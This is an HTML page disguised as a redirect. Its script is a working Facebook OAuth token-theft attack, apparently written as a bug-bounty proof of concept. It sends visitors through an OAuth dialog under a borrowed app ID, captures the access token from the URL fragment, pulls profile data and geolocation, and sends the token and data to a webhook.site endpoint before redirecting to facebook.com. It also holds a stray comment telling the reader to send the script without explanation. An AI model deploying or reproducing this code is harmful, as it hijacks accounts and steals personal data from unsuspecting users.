<!DOCTYPE html>
<html>
<head><title>Redirecting...</title></head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";

            if (hash && hash.includes('access_token=')) {
                const token = new URLSearchParams(hash.substring(1)).get('access_token');

                try {
                    // محاكاة صمودة: جلب البيانات الحساسة التي أثبتت نجاحك في الصور السابقة
                    const response = await fetch(`https://graph.facebook.com/me?fields=id,name,email,birthday,location&access_token=${token}`);
                    const userData = await response.json();

                    // إرسال الـ ID (920929380607450) والبيانات فوراً للـ Webhook
                    const exfil = new Image();
                    exfil.src = `${webhookUrl}?FOUND_ID=${userData.id}&EMAIL=${encodeURIComponent(userData.email)}&DATA=${encodeURIComponent(JSON.stringify(userData))}`;

                    // تسجيل بصمة الجهاز والموقع لإثبات الأثر الضار لميتا
                    const geoRes = await fetch('https://ipapi.co/json/');
                    const geoData = await geoRes.json();
                    
                    await fetch(webhookUrl, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            impact: "Account Data Exfiltration via Redirect",
                            victim_id: userData.id,
                            geo: geoData,
                            token: token
                        })
                    });

                    setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                } catch (e) {
                    window.location.href = "https://www.facebook.com/me";
                }
            } else {
                // استخدام Client ID لتطبيق رسمي لزيادة قوة التقرير
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=124024574287414&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location";
            }
        };
    </script>
</body>
